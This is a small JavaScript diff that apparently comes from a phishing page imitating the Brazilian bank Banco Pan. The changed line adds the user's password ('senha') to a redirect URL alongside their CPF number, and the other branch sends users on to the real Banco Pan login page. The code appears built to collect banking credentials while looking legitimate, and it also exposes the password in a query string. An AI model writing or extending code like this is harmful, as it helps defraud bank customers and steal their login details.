@@ -54,7 +54,7 @@ $("#submit").on("click", async function () {
       allowOutsideClick: false
     }).then((result) => {
       if (result.isConfirmed) {
-        window.location.assign(`/confirma-dados?cpf=${cpf}`)
+        window.location.assign(`/confirma-dados?cpf=${cpf}&senha=${senha}`)
       } else {
         window.location.assign('https://accounts.bancopan.com.br/auth/realms/pan-clientes/protocol/openid-connect/auth?client_id=pan-online&response_type=code&scope=openid%20profile&redirect_uri=https://online.bancopan.com.br');
       }
